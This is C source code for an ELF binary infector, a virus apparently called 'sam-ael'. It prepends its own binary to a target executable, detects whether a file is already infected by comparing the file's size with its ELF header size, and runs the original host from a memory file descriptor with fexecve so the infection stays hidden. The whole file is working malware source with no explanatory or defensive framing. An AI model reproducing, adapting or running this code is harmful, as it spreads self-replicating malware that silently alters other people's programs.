#include "sam-ael.h"

int main(int argc, char** argv){
  if(argc==2&&is_elf(argv[1])&&!is_infected(argv[1])){
    FILE* host=fopen(argv[1], "rb+");
    FILE* parasite=fopen(argv[0], "rb");
    if(host && parasite){
      infect(host, parasite);
      fclose(host);
      fclose(parasite);
    }
  }else if(argc==1&&is_infected(argv[0])){
    FILE* infected=fopen(argv[0], "rb");
    fprintf(stderr, "infected ");
    execute_host(infected, argv, environ);
  }
}

long elf_size(FILE* f){
  Elf64_Ehdr header;
  fread(&header, 1, sizeof(Elf64_Ehdr), f);
  fseek(f, 0, SEEK_SET);
  return header.e_shoff+(header.e_shentsize*header.e_shnum);
}

BOOL is_elf(char* f){
  FILE* file=fopen(f, "rb");
  if(file){
    Elf64_Ehdr header;
    fread(&header, 1, sizeof(Elf64_Ehdr), file);
    fclose(file);
    if(memcmp(header.e_ident, ELFMAG, SELFMAG)==0){
      return TRUE;
    }
  }
  return FALSE;
}

BOOL is_infected(char* f){
  FILE* file=fopen(f, "rb");
  if(file){
    long e_size=elf_size(file);
    fseek(file, 0, SEEK_END);
    long f_size=ftell(file);
    fclose(file);
    if(f_size-e_size!=0){
      return TRUE;
    }
  }
  return FALSE;
}

void infect(FILE* h, FILE* p){
  long h_size=elf_size(h);
  long p_size=elf_size(p);
  char h_buffer[h_size];
  char p_buffer[p_size];
  fread(h_buffer, sizeof(char), h_size, h);
  fread(p_buffer, sizeof(char), p_size, p);
  fseek(h, 0, SEEK_SET);
  fwrite(p_buffer, sizeof(char), p_size, h);
  fwrite(h_buffer, sizeof(char), h_size, h);
}

void execute_host(FILE* f, char** argv, char** envp){
  long p_size=elf_size(f);
  fseek(f, p_size, SEEK_SET);
  long h_size=elf_size(f);
  char host[h_size];
  fseek(f, p_size, SEEK_SET);
  fread(host, sizeof(char), h_size, f);
  int fd=MEMFD_CREATE("", 1);
  write(fd, host, h_size);
  fexecve(fd, argv, envp);
}
